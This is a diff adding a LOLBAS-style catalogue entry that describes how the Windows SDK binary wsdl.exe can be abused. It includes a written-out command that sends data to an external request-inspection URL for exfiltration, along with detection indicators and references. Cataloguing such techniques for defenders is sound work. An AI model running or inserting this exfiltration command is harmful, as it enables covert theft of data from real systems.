@@ -1,0 +1,26 @@
+---
+Name: wsdl.exe
+Description: .NET Frameworks WebService install and administration tool
+Author: Ialle Teixeira
+Created: 2022-03-28
+Commands:
+  - Command: wsdl.exe /server https://requestinspector.com/insp/inspect/XXXXXXXXXXXXXXX
+    Description: "Exfiltrate data via a HTTP web request's URL."
+    Usecase: Exfiltrate data
+    Category: Upload
+    Privileges: User
+    MitreID: T1567
+    OperatingSystem: Windows 10, Windows 11
+Full_Path:
+  - Path: C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\wsdl.exe
+Detection:
+  - IOC: Preventing/Detecting wsdl.exe with non-RFC1918 addresses by Network IPS/IDS.
+  - IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching wsdl.exe file.
+  - IOC: User Agent is "Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 4.0.30319.42000)"
+Resources:
+  - Link: https://docs.microsoft.com/en-us/windows/win32/wsw/portal
+  - Link: https://en.wikipedia.org/wiki/Web_Services_Description_Language
+  - Link: https://social.msdn.microsoft.com/Forums/pt-BR/e15ce975-49c4-4aae-9b26-d66dc34ea122/como-utilizar-wsdlexe?forum=aspnetpt
+  - Link: https://pt.stackoverflow.com/questions/29116/o-que-%C3%A9-wsdl-web-services-description-language
+Acknowledgement:
+  - Person: Ialle Teixeira
